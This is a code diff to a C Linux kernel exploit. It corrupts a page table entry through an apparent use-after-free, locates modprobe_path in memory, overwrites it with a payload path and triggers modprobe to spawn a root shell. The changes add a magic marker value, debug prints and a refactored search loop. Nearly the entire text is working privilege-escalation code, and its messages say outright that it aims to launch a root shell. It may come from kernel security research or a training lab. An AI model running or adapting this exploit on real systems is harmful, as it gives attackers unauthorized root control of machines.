@@ -118,10 +118,14 @@ int act(int act_fd, int code, int n, char *args)
 
 #define PGD_N 64
 
+#define MAGIC_VAL 0xc001c0ffeebadbadlu
+
 int prepare_page_tables(void)
 {
 	unsigned long *addr = NULL;
 	long i = 0;
+
+	printf("[!] preparing page tables\n");
 
 	/* Allocate page table hierarchy */
 	addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
@@ -130,7 +134,8 @@ int prepare_page_tables(void)
 		perror("[-] mmap");
 		return EXIT_FAILURE;
 	}
-	*addr = 0xcafecafe;
+	printf("[+] mmap 1: %p\n", addr);
+	*addr = MAGIC_VAL;
 
 	/*
 	 * Prepare the resources for PTE that will later reclaim
@@ -144,8 +149,9 @@ int prepare_page_tables(void)
 			return EXIT_FAILURE;
 		}
 	}
-
-	printf("[+] page tables are prepared\n");
+	printf("[+] mmap 2: from %p to %p\n",
+			PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0),
+			PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0));
 
 	return EXIT_SUCCESS;
 }
@@ -238,7 +244,7 @@ void *memmem_modprobe_path(void *memory, size_t memory_size)
 		printf("[-] modprobe_path is not found in memory pointed by corrupted PTE\n");
 		return NULL;
 	}
-	printf("[+] found modprobe_path in memory pointed by corrupted PTE\n");
+	printf("[+] found modprobe_path at %p\n", modprobe_path_uaddr);
 
 	/* Test overwriting modprobe_path */
 	modprobe_path_uaddr[0] = 'x';
@@ -318,7 +324,6 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	char act_args[DRILL_ACT_SIZE] = { 0 };
-	void *modprobe_addr;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
@@ -410,7 +415,7 @@ int main(void)
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
 
 		/* Allocate and populate a new PTE */
-		*addr = 0xcafecafe;
+		*addr = MAGIC_VAL;
 	}
 	printf("[+] PTE has been created\n");
 
@@ -426,33 +431,34 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */
+	flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
 
 	for (int i = 0; i < PT_ENTRIES; i++) {
-		unsigned int *ptr = (unsigned int *)PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
-		void *virt_address = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
-		unsigned int value = *ptr;
+		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
+		unsigned long val = *addr;
+		char *modprobe_path_uaddr = NULL;
 
-		if (value != 0xcafecafe) {
-			modprobe_addr = memmem_modprobe_path(virt_address, PAGE_SIZE);
+		if (val == MAGIC_VAL)
+			continue;
 
-			if (modprobe_addr != NULL) {
-				printf("[+] success, userspace modprobe address %p\n",
-				       modprobe_addr);
+		printf("[+] corrupted PTE entry is detected, now search modprobe_path\n");
+		modprobe_path_uaddr = memmem_modprobe_path(addr, PAGE_SIZE);
+		if (modprobe_path_uaddr == NULL)
+			break;
+
+		/* TODO: refactoring */
 				printf("[!] dump an exploit fd and write its path as new modprobe path via the overwritten target object\n");
 
 				char *privesc = prepare_payload();
 				if (privesc == NULL)
 					goto end;
-				strcpy(modprobe_addr, privesc);
+				strcpy(modprobe_path_uaddr, privesc);
 
 				printf("[+] done, triggering a corrupted modprobe to launch a root shell\n");
 				ret = modprobe_trigger_sock();
 				if (ret == EXIT_FAILURE)
 					goto end;
 				break;
-			}
-		}
 	}
 
 	printf("[-] exploit failed\n");
